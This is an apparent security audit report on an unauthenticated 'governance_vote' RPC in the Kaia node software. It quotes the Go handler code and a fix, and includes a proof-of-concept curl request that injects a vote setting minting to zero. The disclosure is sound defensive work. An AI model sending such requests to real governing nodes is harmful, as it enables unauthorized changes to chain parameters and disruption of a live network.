### Title
Unauthenticated `governance_vote` Public RPC Allows Any HTTP Client to Inject Governance Votes on Behalf of the Governing Node — (`File: kaiax/gov/headergov/impl/api.go`)

---

### Summary

The `governance_vote` RPC method is registered as `Public: true` under the `governance` namespace and is accessible over HTTP/WebSocket. The handler uses the **node's own address** as the voter identity rather than authenticating the RPC caller. Any unauthenticated HTTP client that can reach the RPC endpoint can inject a governance vote on behalf of the governing node, causing unauthorized changes to protected chain parameters such as `reward.mintingamount`, `governance.unitprice`, `istanbul.committeesize`, and `reward.ratio`.

---

### Finding Description

The `Vote` function in `kaiax/gov/headergov/impl/api.go` sets the voter to `api.h.nodeAddress` — the node's own address — without verifying that the RPC caller is the legitimate node operator:

```go
func (api *headerGovAPI) Vote(name string, value any) (string, error) {
    var (
        voter     = api.h.nodeAddress   // node's own address, NOT the caller
        ...
    )
    if gMode == "single" && voter != gp.GoverningNode {
        return "", ErrVotePermissionDenied
    }
    ...
    api.h.PushMyVotes(vote)
    ...
}
``` [1](#0-0) 

The permission check on line 61 only verifies whether the **node itself** is the governing node — it does not verify whether the **RPC caller** is the node operator. If the node is the governing node (the only node allowed to vote in `single` mode, which is the Mainnet/Kairos configuration), the check passes for any caller.

The API is registered as `Public: true`:

```go
func (h *headerGovModule) APIs() []rpc.API {
    return []rpc.API{
        {
            Namespace: "governance",
            Version:   "1.0",
            Service:   NewHeaderGovAPI(h),
            Public:    true,
        },
    }
}
``` [2](#0-1) 

The HTTP endpoint registration logic in `networks/rpc/endpoints.go` exposes any API that is `Public: true` and not `IPCOnly` when the namespace is in the whitelist or the whitelist is empty:

```go
if !api.IPCOnly && (whitelist[api.Namespace] || (len(whitelist) == 0 && api.Public)) {

``` [3](#0-2) 

The README for the module explicitly documents calling `governance_vote` via plain HTTP `curl`, confirming this is the intended production usage pattern: [4](#0-3) 

The default HTTP module list is `["net"]`, but governance nodes are expected to add `"governance"` to expose this API. Once exposed, there is no caller authentication — no API key, no session token, no signature check.

---

### Impact Explanation

When the `governance` namespace is included in the HTTP module list (the intended configuration for a governing node), any unauthenticated HTTP/WebSocket client that can reach the RPC port can call `governance_vote` and inject a vote into the node's pending vote queue (`myVotes`). The vote will be written into the next block header (`header.Vote`) when the node becomes a proposer.

Ratified votes change protected chain state:
- `reward.mintingamount` — controls KAIA minting per block (unauthorized mint/burn impact)
- `reward.ratio` — redirects reward distribution between CN/KGF/KIR
- `governance.unitprice` — changes the minimum gas price
- `istanbul.committeesize` — disrupts consensus committee formation
- `governance.governingnode` — in `none` mode, transfers governance authority to an attacker-controlled address [5](#0-4) 

---

### Likelihood Explanation

- The governing node in `single` mode (Mainnet/Kairos) is the only node whose votes are ratified. An attacker targeting that specific node's RPC endpoint gains full governance control.
- The `governance_vote` API is `Public: true` and the README documents HTTP access, making it a standard operational pattern to expose this endpoint.
- No authentication is required — a single unauthenticated HTTP POST is sufficient.
- The RPC port (default 8551) is commonly exposed on governance infrastructure for operational management.

---

### Recommendation

The `governance_vote` API should not be `Public: true`. It should be either:
1. Changed to `Public: false` (and `IPCOnly: true`) so it is only accessible via the local IPC socket, which requires OS-level access to the node's data directory, OR
2. Require the caller to authenticate (e.g., sign a challenge with the node's private key) before a vote is accepted.

The `VerifyVote` path in `header.go` already enforces that the voter must be the block proposer at consensus time, but this does not prevent an attacker from injecting a vote into the pending queue before the node proposes a block. [6](#0-5) 

---

### Proof of Concept

Precondition: The target node is the governing node in `single` mode and has `governance` in its HTTP module list (e.g., started with `--rpcapi "kaia,net,governance"`).

```bash
# Inject a vote to set reward.mintingamount to 0 (halt minting)
curl http://<governing-node-rpc>:8551 \
  -X POST \
  -H 'Content-Type: application/json' \
  --data '{
    "jsonrpc":"2.0",
    "id":1,
    "method":"governance_vote",
    "params":["reward.mintingamount","0"]
  }'
# Response: {"result":"(kaiax) Your vote is prepared..."}
```

The vote is now in `myVotes`. When the governing node next proposes a block, `PrepareHeader` writes the vote into `header.Vote`. At the next epoch boundary, the ratification sets `reward.mintingamount = 0`, halting all KAIA minting from that epoch forward. [5](#0-4) [1](#0-0)

func (api *headerGovAPI) Vote(name string, value any) (string, error) {
	var (
		voter     = api.h.nodeAddress
		nextBlock = api.h.Chain.CurrentBlock().NumberU64() + 1
		gp        = api.h.GetParamSet(nextBlock)
		gMode     = gp.GovernanceMode
	)

	if gMode == "single" && voter != gp.GoverningNode {
		return "", ErrVotePermissionDenied
	}

	vote := headergov.NewVoteData(voter, name, value)
	if vote == nil {
		return "", ErrInvalidKeyValue
	}

	if gov.DeprecatedAt(vote.Name(), api.h.ChainConfig.Rules(new(big.Int).SetUint64(nextBlock))) {
		return "", ErrDeprecatedVote
	}

	err := api.h.checkConsistency(nextBlock, vote)
	if err != nil {
		return "", err
	}

	// TODO-kaiax: add removevalidator vote check

	api.h.PushMyVotes(vote)
	return "(kaiax) Your vote is prepared. It will be put into the block header or applied when your node generates a block as a proposer. Note that your vote may be duplicate.", nil

func (h *headerGovModule) PrepareHeader(header *types.Header) error {
	// if this node has a vote waiting to be casted, put Vote field.
	if vote, ok := h.peekMyVote(); ok {
		voteBytes, err := vote.ToVoteBytes()
		if err != nil {
			return err
		}
		header.Vote = voteBytes
		logger.Debug("Prepare header with vote", "num", header.Number.Uint64(), "vote", hexutil.Encode(header.Vote))
	}

	// if epoch block & vote exists in the last epoch, put Governance field.
	if header.Number.Uint64()%h.epoch == 0 {
		gov := h.getExpectedGovernance(header.Number.Uint64())
		if len(gov.Items()) > 0 {
			govBytes, err := gov.ToGovBytes()
			if err != nil {
				return err
			}
			header.Governance = govBytes
			logger.Debug("Prepare header with governance", "num", header.Number.Uint64(), "governance", hexutil.Encode(header.Governance))
		}
	}

	return nil
}

// VerifyVote checks the following:
// (1) voter must be in valset,
// (2) integrity of the voter (the voter must be the block proposer),
// (3) the vote value must be consistent compared to the latest ParamSet.
func (h *headerGovModule) VerifyVote(header *types.Header) error {
	if len(header.Vote) == 0 {
		return nil
	}

	var (
		vb       headergov.VoteBytes = header.Vote
		blockNum                     = header.Number.Uint64()
	)

	vote, err := vb.ToVoteData()
	if err != nil {
		logger.Error("ToVoteData error", "num", blockNum, "vote", vb, "err", err)
		return err
	}

	if gov.DeprecatedAt(vote.Name(), h.ChainConfig.Rules(header.Number)) {
		logger.Error("Vote is deprecated", "num", blockNum, "name", vote.Name())
		return ErrDeprecatedVote
	}

	council, err := h.ValSet.GetCouncil(blockNum)
	if err != nil {
		return err
	}

	// check if the voter is in council
	if !slices.Contains(council, vote.Voter()) {
		return ErrInvalidKeyValue
	}

	// check if Voter is the block proposer.
	author, err := h.Chain.Sealer().Author(header)
	if err != nil {
		return err
	}
	if author != vote.Voter() {
		return ErrInvalidVoter
	}

	// In single mode, only the governing node can write header.Vote after Permissionless.
	params := h.GetParamSet(blockNum)
	if h.ChainConfig.IsPermissionlessForkEnabled(new(big.Int).SetUint64(blockNum)) &&
		params.GovernanceMode == "single" &&
		vote.Voter() != params.GoverningNode {
		return ErrVotePermissionDenied
	}

	return h.checkConsistency(blockNum, vote)
}
